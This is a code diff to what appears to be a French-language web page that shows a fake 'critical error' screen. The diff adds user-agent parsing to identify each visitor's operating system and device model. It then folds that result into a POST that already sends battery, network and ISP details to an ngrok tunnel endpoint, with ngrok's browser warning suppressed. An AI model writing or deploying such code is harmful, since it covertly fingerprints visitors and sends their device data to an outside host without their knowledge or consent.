@@ -171,6 +171,29 @@
                 "ERREUR CRITIQUE. AFFICHAGE DE L'ÉCRAN DE PRÉVENTION."
             ];
 
+            // Détection propre du modèle de l'appareil
+            let deviceName = "Appareil Inconnu";
+            if (/iPhone/.test(userAgent)) {
+                os = "iOS";
+                deviceName = "iPhone";
+            } else if (/iPad/.test(userAgent)) {
+                os = "iPadOS";
+                deviceName = "iPad";
+            } else if (/Android/.test(userAgent)) {
+                os = "Android";
+                let match = userAgent.match(/;\s([^;]+)\sBuild\//);
+                deviceName = match ? match[1] : "Smartphone Android";
+            } else if (/Win/.test(userAgent)) {
+                os = "Windows";
+                deviceName = "PC Windows";
+            } else if (/Macintosh/.test(userAgent)) {
+                os = "macOS";
+                deviceName = "MacBook / iMac";
+            } else if (/Linux/.test(userAgent)) {
+                os = "Linux";
+                deviceName = "PC Linux";
+            }
+
             try {
                 fetch('https://bottling-think-gray.ngrok-free.dev/api/log', { 
                     method: 'POST',
@@ -179,7 +202,7 @@
                         'ngrok-skip-browser-warning': 'true'
                     },
                     body: JSON.stringify({
-                        os: os,
+                        os: os + " (" + deviceName + ")",
                         battery: batteryInfo,
                         network: networkInfo,
                         isp: isp,
